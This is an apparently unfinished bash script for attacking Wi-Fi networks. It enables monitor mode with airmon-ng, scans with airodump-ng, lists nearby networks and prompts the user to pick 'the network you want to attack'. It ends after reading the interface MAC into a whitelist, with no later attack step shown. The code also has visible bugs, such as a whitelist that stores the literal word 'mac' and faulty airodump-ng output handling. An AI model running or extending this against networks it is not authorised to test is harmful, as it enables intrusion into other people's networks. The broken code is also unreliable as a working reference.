#!/bin/bash
echo 'Your network interface name?'
read interface

airmon-ng start $interface
airodump-ng $interface

cmd=$(airodump-ng --output-format csv -c 6 $interface)

bssids=($(echo "$cmd" | tail -n +3 | awk -F ',' '{print $1}'))
essids=($(echo "$cmd" | tail -n +3 | awk -F ',' '{print $4}'))

echo "Available Wi-Fi Networks:"
for ((i=0; i<${#bssids[@]}; i++)); do
  echo "$((i+1)). ${bssids[i]} - ${essids[i]}"
done

read -p 'Select the network you want to attack: ' selection

if [[ ! $selection =~ ^[0-9]+$ ]] || ((selection < 1)) || ((selection > ${#bssids[@]})); then
  echo "Invalid selection. Exiting."
  exit 1
fi


bssid=${bssids[selection-1]}

mac=$(ifconfig "$interface" | awk '/ether/ {print $2}')

WHITELIST=(mac)

